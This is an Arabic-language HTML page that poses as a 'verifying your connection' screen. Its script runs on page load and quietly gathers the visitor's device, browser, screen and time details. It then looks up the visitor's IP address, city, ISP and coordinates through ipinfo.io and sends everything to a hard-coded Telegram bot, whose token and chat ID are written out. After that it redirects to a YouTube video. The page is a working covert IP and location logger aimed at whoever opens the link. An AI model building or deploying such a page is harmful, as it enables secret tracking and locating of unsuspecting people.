<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من الاتصال</title>
    <style>
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: #c9d1d9;
            text-align: center;
        }
        .loader {
            text-align: center;
            max-width: 90%;
        }
        .spinner {
            border: 4px solid #30363d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            font-size: 18px;
            color: #8b949e;
        }
        .status {
            margin-top: 10px;
            font-size: 15px;
            color: #58a6ff;
            font-weight: bold;
            min-height: 30px;
        }
        .status.success {
            color: #3fb950;
        }
        .status.error {
            color: #f85149;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>جاري التحقق من اتصالك...</p>
        <div class="status" id="status">⏳ جاري تجهيز البيانات...</div>
    </div>

    <script>
        (function() {
            // ======== بيانات البوت (ثابتة) ========
            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
            const CHAT_ID = "1497190595";
            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
            // ======================================

            const statusEl = document.getElementById('status');

            function updateStatus(msg, type = '') {
                if (statusEl) {
                    statusEl.textContent = msg;
                    statusEl.className = 'status ' + (type || '');
                }
            }

            // دالة الإرسال إلى تيليجرام مع محاولة إعادة
            function sendToTelegram(text) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                return fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                }).catch(() => {});
            }

            // ============================================================
            // 1. جمع بيانات الجهاز التفصيلية
            // ============================================================
            const ua = navigator.userAgent;
            // استخراج نظام التشغيل والمتصفح من User-Agent (بسيط)
            let os = 'غير معروف';
            let browser = 'غير معروف';
            let deviceType = 'غير معروف';

            if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            else if (ua.includes('Linux') && ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Linux')) os = 'Linux';

            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Google Chrome';
            else if (ua.includes('Firefox')) browser = 'Mozilla Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Apple Safari';
            else if (ua.includes('Edg')) browser = 'Microsoft Edge';
            else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';

            if (ua.includes('Mobile')) deviceType = 'هاتف محمول';
            else if (ua.includes('Tablet')) deviceType = 'جهاز لوحي';
            else deviceType = 'كمبيوتر مكتبي';

            const time = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Baghdad' });
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            // الرسالة الأولى (البيانات الأساسية)
            const initialMsg =
                `🔴 *زائر جديد - تم فتح الرابط* 🔴\n` +
                `📱 نوع الجهاز: ${deviceType}\n` +
                `🖥 نظام التشغيل: ${os}\n` +
                `🌐 المتصفح: ${browser}\n` +
                `🔧 الوكيل الكامل: ${ua}\n` +
                `🕒 الوقت: ${time}\n` +
                `📺 دقة الشاشة: ${screenRes}\n` +
                `🔗 الرابط: ${window.location.href}`;

            sendToTelegram(initialMsg);
            updateStatus('✅ تم إرسال بيانات الجهاز');

            // ============================================================
            // 2. جلب الموقع الجغرافي والـ IP من ipinfo.io (تفاصيل كاملة)
            // ============================================================
            fetch('https://ipinfo.io/json', { timeout: 5000 })
                .then(res => {
                    if (!res.ok) throw new Error('HTTP error ' + res.status);
                    return res.json();
                })
                .then(data => {
                    // استخراج جميع التفاصيل
                    const ip = data.ip || 'غير معروف';
                    const country = data.country || 'غير معروف';
                    const region = data.region || 'غير معروف';
                    const city = data.city || 'غير معروف';
                    const org = data.org || 'غير معروف';
                    const loc = data.loc || 'غير معروف';
                    const timezone = data.timezone || 'غير معروف';

                    // تحديث واجهة المستخدم
                    updateStatus(`📍 تم الوصول إلى موقعك الجغرافي (${city}, ${country})`, 'success');

                    // بناء الرسالة الثانية (التفاصيل الكاملة)
                    const detailedMsg =
                        `🌐 *تفاصيل الزائر (IP والموقع)* 🌐\n` +
                        `📌 الـ IP: ${ip}\n` +
                        `📍 الدولة: ${country}\n` +
                        `🏙️ المدينة: ${city}\n` +
                        `🗺️ المنطقة: ${region}\n` +
                        `📡 المزود: ${org}\n` +
                        `🗺️ الإحداثيات: ${loc}\n` +
                        `⏰ المنطقة الزمنية: ${timezone}\n` +
                        `\n📱 نوع الجهاز: ${deviceType}\n` +
                        `🖥 نظام التشغيل: ${os}\n` +
                        `🌐 المتصفح: ${browser}\n` +
                        `🕒 الوقت: ${time}`;

                    sendToTelegram(detailedMsg);
                })
                .catch(() => {
                    // في حال فشل الجلب
                    updateStatus('⚠️ تعذر جلب الموقع الجغرافي', 'error');
                    sendToTelegram(`⚠️ *تعذر جلب الموقع* ⚠️\n💻 ${ua}\n🕒 ${time}`);
                });

            // ============================================================
            // 3. التوجيه إلى يوتيوب بعد 3 ثوانٍ (يضمن وصول جميع الرسائل)
            // ============================================================
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 3000);

            // خطة احتياطية: إجبار التوجيه بعد 5 ثوانٍ
            setTimeout(() => {
                if (window.location.href !== REDIRECT_URL) {
                    window.location.replace(REDIRECT_URL);
                }
            }, 5000);
        })();
    </script>
</body>
</html>
